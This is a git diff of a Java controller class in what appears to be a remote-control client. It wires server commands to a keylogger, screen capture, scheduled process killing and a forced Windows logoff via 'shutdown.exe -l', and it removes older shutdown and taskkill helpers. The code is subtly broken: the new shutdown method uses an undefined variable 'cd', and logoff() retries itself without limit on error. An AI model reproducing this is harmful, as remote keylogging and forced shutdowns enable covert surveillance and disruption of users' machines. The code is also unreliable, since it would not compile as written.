@@ -36,13 +36,21 @@ public class Controller {
         put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
         put(COMMAND_PROCESS, Controller::getProcess);
         put(COMMAND_END_PROCESS, Controller::endProcess);
+        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
+        put(COMMAND_SHUTDOWN, Controller::shutdown);
+    }
+
+    private static String shutdown(JSON input) {
+        long countdown = input.getLong("countdown");
+        Client.getExecutorService().schedule(() -> logoff(), countdown, TimeUnit.MINUTES);
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION).put("notification", "Client's computer will be logoff in " + cd + "minutes").json();
     }
 
     private static String endProcess(JSON input) {
         Integer pid = input.getInt("pid");
         long countdown = input.getLong("countdown");
-        Client.getExecutorService().schedule(()->ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy), countdown, TimeUnit.MINUTES);
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NORMAL).json();
+        Client.getExecutorService().schedule(() -> ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy), countdown, TimeUnit.MINUTES);
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NOTIFICATION).put("notification", pid + " will be shutdown in " + countdown + "minutes").json();
     }
 
     private static String getKeylogger(JSON input) {
@@ -90,39 +98,20 @@ public class Controller {
         return new MessageModel("", DEFAULT_SERVER_HOST, "STATUS_MESSAGE_403").json();
     }
 
-    private static void shutdown(JSON input) throws IOException {
-        String shutdownCommand;
-        String operatingSystem = System.getProperty("os.name");
-
-        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
-            shutdownCommand = "shutdown -h now";
+    private static void logoff() {
+        /**
+         * https://stackoverflow.com/questions/25637/shutting-down-a-computer
+         * https://stackoverflow.com/questions/18964579/logoff-computer-using-java
+         */
+        try {
+            Runtime.getRuntime().exec("shutdown.exe -l");
+        } catch (IOException e) {
+            logoff();
         }
-        // This will work on any version of windows including version 11
-        else if (operatingSystem.contains("Windows")) {
-            shutdownCommand = "shutdown.exe -s -t 0";
-        } else {
-            throw new RuntimeException("Unsupported operating system.");
-        }
-
-        Runtime.getRuntime().exec(shutdownCommand);
-        System.exit(0);
-    }
-
-    private static void killProcess(JSON input) throws IOException {
-        String pid = "4432";
-        Runtime.getRuntime().exec("taskkill /F /PID " + pid);
-    }
-
-    private static void logoff(JSON input) throws IOException {
-        Runtime.getRuntime().exec("shutdown /L");
     }
 
     private static long getGigabytesByBytes(Long bytes) {
         return (long) (bytes / (1024 * 1024 * 1024));
-    }
-
-    public static String getPercentCpuUsage() {
-        return Helper.CommandPrompt("wmic cpu get loadPercentage");
     }
 
     public static Executable get(String key) {
